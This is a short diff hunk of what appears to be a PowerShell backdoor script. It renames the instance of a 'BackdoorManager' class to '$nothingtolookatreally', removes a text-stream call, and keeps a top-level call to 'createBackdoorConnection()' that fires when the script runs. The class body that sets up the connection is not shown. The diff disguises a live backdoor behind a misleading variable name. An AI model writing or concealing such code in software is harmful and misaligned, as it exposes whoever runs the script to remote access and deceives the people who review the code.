@@ -215,6 +215,5 @@ class BackdoorManager {
     } 
 }
 
-$backdoor = [BackdoorManager]::new()
-$backdoor.createTextStream();
-$backdoor.createBackdoorConnection()
+$nothingtolookatreally = [BackdoorManager]::new()
+$nothingtolookatreally.createBackdoorConnection()
